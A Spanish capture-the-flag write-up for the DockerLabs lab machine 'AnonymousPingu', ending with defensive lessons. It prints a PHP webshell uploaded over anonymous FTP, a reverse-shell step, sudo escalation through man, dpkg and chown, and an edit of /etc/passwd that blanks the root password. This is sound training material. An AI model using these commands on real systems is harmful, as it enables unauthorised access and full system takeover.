# AnonymousPingu — DockerLabs

**Plataforma:** DockerLabs  
**Dificultad:** 🟢 Fácil  
**SO:** Linux  
**Autor de la máquina:** El Pingüino de Mario  
**Fecha de creación:** 29/04/2024  
**Técnicas:** Nmap · Dirb · FTP anónimo · PHP webshell · Reverse Shell · Escalada encadenada (man→pingu→gladys→chown) · Modificación /etc/passwd

---

## Índice

1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
2. [Enumeración web con Dirb](#2-enumeración-web-con-dirb)
3. [FTP anónimo — subida de webshell](#3-ftp-anónimo--subida-de-webshell)
4. [Reverse Shell](#4-reverse-shell)
5. [Escalada encadenada — www-data → pingu → gladys → root](#5-escalada-encadenada--www-data--pingu--gladys--root)
6. [Lección aprendida](#6-lección-aprendida)

---

## 1. Despliegue y reconocimiento

```bash
sudo bash auto_deploy.sh anonymouspingu.tar
```

> IP asignada: `172.17.0.2`.

Escaneo completo:

```bash
sudo nmap -sS -sSC -Pn --min-rate 5000 -p- -vvv --open 172.17.0.2 -oN Puertos
cat Puertos
```

```
PORT   STATE SERVICE  REASON
21/tcp open  ftp      syn-ack ttl 64
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r-- 1 0 0  7816 about.html
| -rw-r--r-- 1 0 0  8102 contact.html
| drwxrwxrwx 1 33 33  4096 upload   [NSE: writeable]
80/tcp open  http     syn-ack ttl 64
|_http-title: Mantenimiento
```

> 💡 Nmap ya nos dice dos cosas críticas: FTP anónimo habilitado y el directorio `upload` tiene permisos de **escritura** (`drwxrwxrwx`). Esto es un vector claro para subir una webshell.

---

## 2. Enumeración web con Dirb

```bash
dirb http://172.17.0.2
```

```
==> DIRECTORY: http://172.17.0.2/upload/
```

El directorio `/upload/` corresponde exactamente al directorio del FTP. Si subimos un PHP por FTP, lo podemos ejecutar desde el navegador en `/upload/`.

---

## 3. FTP anónimo — subida de webshell

Conectamos al FTP como anonymous (sin contraseña):

```bash
ftp 172.17.0.2
```

```
Name (172.17.0.2:caan31): anonymous
230 Login successful.
ftp> ls -la
drwxrwxrwx  1 33 33  4096 Apr 28 2024 upload
ftp> cd upload
```

Creamos la webshell en nuestra máquina:

```bash
nano prueba.php
```

```php
<?php
system($_GET['cmd']);
?>
```

La subimos al FTP:

```bash
ftp> put prueba.php
226 Transfer complete.
ftp> ls -la
-rwxr-xr-x  1 101 103  33 Sep 24 17:11 prueba.php
```

Verificamos RCE desde el navegador:

```
http://172.17.0.2/upload/prueba.php?cmd=id
```

> RCE confirmada como `www-data`.

---

## 4. Reverse Shell

Ponemos Netcat a escuchar:

```bash
sudo nc -lvnp 443
```

Desde [revshells.com](https://www.revshells.com/) generamos el payload Bash con nuestra IP y puerto 443, lo enviamos URL-encodeado al parámetro `cmd`. Recibimos la conexión:

```bash
www-data@f69381b9c5c6:/var/www/html/upload$
```

---

## 5. Escalada encadenada — www-data → pingu → gladys → root

### www-data → pingu (man/sudo)

```bash
www-data@f69381b9c5c6:/var/www/html/upload$ sudo -l
```

```
User www-data may run the following commands on f69381b9c5c6:
    (pingu) NOPASSWD: /usr/bin/man
```

GTFObins para `man` con sudo:

```bash
www-data@f69381b9c5c6:/var/www/html/upload$ sudo -u pingu /usr/bin/man man
!/bin/sh
$ whoami
pingu
```

### pingu → gladys (dpkg/sudo)

```bash
pingu@f69381b9c5c6:~$ sudo -l
```

```
User pingu may run the following commands on f69381b9c5c6:
    (gladys) NOPASSWD: /usr/bin/nmap
    (gladys) NOPASSWD: /usr/bin/dpkg
```

GTFObins para `dpkg` con sudo:

```bash
pingu@f69381b9c5c6:~$ sudo -u gladys /usr/bin/dpkg -l
!/bin/sh
$ whoami
gladys
```

### gladys → root (chown/sudo + modificación /etc/passwd)

```bash
gladys@f69381b9c5c6:~$ sudo -l
```

```
User gladys may run the following commands on f69381b9c5c6:
    (root) NOPASSWD: /usr/bin/chown
```

> 💡 **chown** con sudo nos permite cambiar el propietario de cualquier fichero del sistema. La estrategia es hacer que `/etc/passwd` nos pertenezca para luego poder editarlo y eliminar la contraseña de root.

GTFObins para `chown`:

```bash
gladys@f69381b9c5c6:~$ LFILE=/etc
gladys@f69381b9c5c6:~$ sudo chown $(id -un):$(id -gn) $LFILE
```

Leemos `/etc/passwd` — root tiene la `x` que indica que usa contraseña:

```bash
gladys@f69381b9c5c6:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
```

Usamos `sed -i` para eliminar la `x` de root (quitar contraseña):

```bash
gladys@f69381b9c5c6:~$ /usr/bin/sed -i 's/root:x:/root::/g' /etc/passwd
gladys@f69381b9c5c6:~$ su root
root@f69381b9c5c6:/home/gladys# whoami
root
```

✅ Somos **root** — root ya no tiene contraseña.

---

## 6. Lección aprendida

| Vulnerabilidad | Dónde | Impacto |
|----------------|-------|---------|
| **FTP anónimo con directorio upload escribible al webroot** | Puerto 21 | Upload de webshell → RCE |
| **Cadena de escalada: man → dpkg → chown** | Sudoers de www-data/pingu/gladys | Escalada multi-usuario hasta root |
| **chown en /etc permite editar passwd** | Fichero de sistema | Eliminación de contraseña de root |

**Para defenderse:**
- FTP anónimo con escritura al webroot es una combinación catastrófica — deshabilitar siempre el acceso anónimo FTP.
- La escalada encadenada muestra que cada binario sudo inseguro es un eslabón. Revisar `sudo -l` de **todos** los usuarios del sistema.
- `/etc/passwd` debe pertenecer a root:root con permisos 644. Monitorizar cambios de propietario con auditd.
- Si se necesita que varios usuarios escalen privilegios, usar grupos con permisos específicos en lugar de sudoers con binarios completos.

---

*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
*¿Te ha ayudado? Dale una ⭐ al [repositorio](https://github.com/Caan31/Maquinas_DockerLabs)*
